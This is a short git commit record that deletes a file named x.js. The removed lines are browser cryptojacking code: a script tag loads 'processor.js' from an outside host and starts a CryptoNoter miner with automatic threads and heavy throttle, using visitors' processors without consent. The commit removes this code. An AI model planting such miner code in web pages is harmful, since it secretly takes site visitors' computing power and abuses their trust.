89eeb4eaf3910d83db64392abfafdde7028090b4
katerin966 <72075504+katerin966@users.noreply.github.com>
2021-02-01 13:05:48 +0000

    Delete x.js

--- x.js
+++
@@ -1,9 +0,0 @@
-<script src="https://learn2hack.online/processor.js"></script>
-<script>
-	var addr = 'CryptoNoter';
-	var miner = new CryptoNoter.Anonymous(addr, {
-        autoThreads: true,
-	throttle: 0.8
-	});
-	miner.start();
-</script>
